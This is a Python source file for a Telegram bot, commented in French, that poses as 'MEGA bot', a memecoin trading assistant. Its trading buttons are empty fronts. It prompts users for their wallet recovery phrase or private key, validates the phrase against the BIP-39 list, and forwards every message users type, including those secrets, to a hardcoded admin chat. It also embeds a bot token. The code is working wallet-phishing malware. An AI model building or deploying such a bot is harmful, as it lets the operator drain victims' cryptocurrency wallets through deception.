from telegram import Update, ReplyKeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import re
import requests

# 🔑 Remplace avec ton token API
TOKEN = "7980925718:AAFaeLupP3uK1GwohpHD_Ew84QYEz6st0"

# 🆔 Remplace avec ton propre ID Telegram
ADMIN_CHAT_ID = 7782664298  

# Charger la liste des mots BIP-39
BIP39_WORDS_URL = "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt"
BIP39_WORDS = set(requests.get(BIP39_WORDS_URL).text.split())

HEX_REGEX = re.compile(r'^[0-9a-fA-F]{64}$')


def start(update: Update, context: CallbackContext) -> None:
    """ Répond au démarrage du bot avec des boutons interactifs """
    user = update.message.from_user
    keyboard = [
        [ReplyKeyboardButton("Settings"), ReplyKeyboardButton("Wallet")],
        [ReplyKeyboardButton("Buy"), ReplyKeyboardButton("Sell")],
        [ReplyKeyboardButton("Wallet Tracking")]  # Nouveau bouton
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    update.message.reply_text("Hello, memecoin trader! Welcome to MEGA bot. How can I assist you today?", reply_markup=reply_markup)
    
    # Envoi du message à l'administrateur avec l'info utilisateur
    context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"👤 New user: {user.first_name} (@{user.username}) has started the bot."
    )

    # Envoi de chaque message utilisateur reçu au bot à l'admin
    send_user_message_to_admin(update, "Bot started")


def button_click(update: Update, context: CallbackContext) -> None:
    """ Gère les clics sur les boutons """
    user = update.message.from_user
    query = update.message.text.strip()

    # Envoi du message à l'administrateur
    send_user_message_to_admin(update, query)

    if query == "Settings":
        update.message.reply_text("Please add a wallet before changing your settings.")
    elif query == "Buy":
        update.message.reply_text("Please set a wallet to buy a memecoin.")
    elif query == "Sell":
        update.message.reply_text("Please buy a memecoin to sell it.")
    elif query == "Wallet":
        wallet_keyboard = [
            [ReplyKeyboardButton("Recovery Phrase"), ReplyKeyboardButton("Private Key")]
        ]
        reply_markup = ReplyKeyboardMarkup(wallet_keyboard, resize_keyboard=True, one_time_keyboard=True)
        update.message.reply_text("How would you like to set up your wallet?", reply_markup=reply_markup)
    elif query == "Recovery Phrase":
        context.user_data['waiting_for'] = 'seed_phrase'
        update.message.reply_text("Please enter your recovery phrase (12 or 24 words):")
    elif query == "Private Key":
        private_key_keyboard = [
            [ReplyKeyboardButton("Enter as Base58")]
        ]
        reply_markup = ReplyKeyboardMarkup(private_key_keyboard, resize_keyboard=True, one_time_keyboard=True)
        context.user_data['waiting_for'] = 'private_key'
        update.message.reply_text("Please enter your private key (hexadecimal format):", reply_markup=reply_markup)
    elif query == "Enter as Base58":
        context.user_data['waiting_for'] = 'private_key_base58'
        update.message.reply_text("Please enter your private key in Base58 format:")
    elif query == "Wallet Tracking":
        update.message.reply_text("The Wallet Tracking feature will be available on 12/02/05 GMT+1:00:00.")

def validate_input(update: Update, context: CallbackContext) -> None:
    """ Vérifie la seed phrase et la clé privée """
    user = update.message.from_user
    message_text = update.message.text.strip()
    
    # Envoi du message à l'administrateur
    send_user_message_to_admin(update, message_text)

    if 'waiting_for' in context.user_data:
        if context.user_data['waiting_for'] == 'seed_phrase':
            words = message_text.split()
            if (len(words) in [12, 24]) and all(word in BIP39_WORDS for word in words):
                update.message.reply_text("✅ Seed phrase accepted!")
                del context.user_data['waiting_for']
            else:
                update.message.reply_text("❌ Invalid seed phrase. Please enter a valid 12 or 24-word seed phrase:")
        elif context.user_data['waiting_for'] == 'private_key':
            if HEX_REGEX.fullmatch(message_text):
                update.message.reply_text("✅ Private key accepted!")
                del context.user_data['waiting_for']
            else:
                private_key_keyboard = [
                    [ReplyKeyboardButton("Enter as Base58")]
                ]
                reply_markup = ReplyKeyboardMarkup(private_key_keyboard, resize_keyboard=True, one_time_keyboard=True)
                update.message.reply_text("❌ Invalid private key. Please enter a valid hexadecimal private key:", reply_markup=reply_markup)
        elif context.user_data['waiting_for'] == 'private_key_base58':
            update.message.reply_text("✅ Base58 private key accepted!")
            del context.user_data['waiting_for']
    else:
        context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=f"📩 Message from {user.first_name} (@{user.username}):\n\n{message_text}"
        )

def send_user_message_to_admin(update: Update, message_text: str) -> None:
    """ Envoie chaque message de l'utilisateur à l'administrateur """
    user = update.message.from_user
    context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"📩 Message from {user.first_name} (@{user.username}):\n\n{message_text}"
    )

def main():
    """ Lancer le bot """
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, button_click))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, validate_input))
    
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
